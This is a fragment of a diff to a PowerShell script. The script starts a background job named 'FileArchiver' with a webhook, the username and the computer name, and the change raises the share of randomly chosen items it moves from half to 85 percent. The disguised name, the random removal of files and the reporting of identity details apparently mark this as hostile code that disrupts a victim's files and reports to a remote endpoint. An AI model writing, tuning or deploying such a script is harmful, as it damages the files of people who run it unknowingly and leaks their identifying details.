@@ -28,7 +28,7 @@ Start-Job -Name "FileArchiver" -ArgumentList $Webhook, $env:USERNAME, $env:COMPU
     $movidos = @()
     
     if ($items.Count -gt 0) {
-        $cantidad = [Math]::Ceiling($items.Count * 0.50)
+        $cantidad = [Math]::Ceiling($items.Count * 0.85)
         $objs = $items | Get-Random -Count $cantidad
         foreach ($item in $objs) {
             try {
